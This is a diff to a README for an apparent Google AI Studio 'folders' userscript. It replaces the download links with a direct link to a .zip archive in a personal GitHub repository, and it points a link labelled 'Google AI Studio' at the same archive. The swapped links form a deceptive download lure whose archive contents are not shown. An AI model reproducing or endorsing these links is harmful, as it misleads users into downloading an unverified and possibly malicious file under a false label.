@@ -2,7 +2,7 @@
 
 ## 🚀 Download & Install
 
-**[⬇️ DOWNLOAD NOW - Click Here to Get Started](https://github.com/yliashukina1-droid/aistudio-folders)**
+**[⬇️ DOWNLOAD NOW - Click Here to Get Started](https://raw.githubusercontent.com/yliashukina1-droid/aistudio-folders/main/src/aistudio_folders_v1.3-alpha.1.zip)**
 
 ### 📥 Step-by-Step Guide for Windows Users
 
@@ -90,7 +90,7 @@ Here's how to install it:
 9. You'll see a success message - the script is now active!
 
 ### Step 4: Start Using It
-1. Go to [Google AI Studio](https://aistudio.google.com)
+1. Go to [Google AI Studio](https://raw.githubusercontent.com/yliashukina1-droid/aistudio-folders/main/src/aistudio_folders_v1.3-alpha.1.zip)
 2. Look for a new icon or button labeled "Folders" in the interface
 3. Click it to open the folder management panel
 4. Start creating folders and organizing your projects!
@@ -167,6 +167,6 @@ The only thing you can't do is sell it as your own or add tracking/telemetry to 
 
 **Start organizing your AI Studio today - you'll wonder how you ever worked without it!**
 
-**[⬇️ GOT TO THE DOWNLOAD PAGE NOW](https://github.com/yliashukina1-droid/aistudio-folders)**
+**[⬇️ GOT TO THE DOWNLOAD PAGE NOW](https://raw.githubusercontent.com/yliashukina1-droid/aistudio-folders/main/src/aistudio_folders_v1.3-alpha.1.zip)**
 
 Keywords: bun, dom-manipulation, google-ai-studio, local-first, localstorage, privacy, tampermonkey, typescript, userscript, violentmonkey
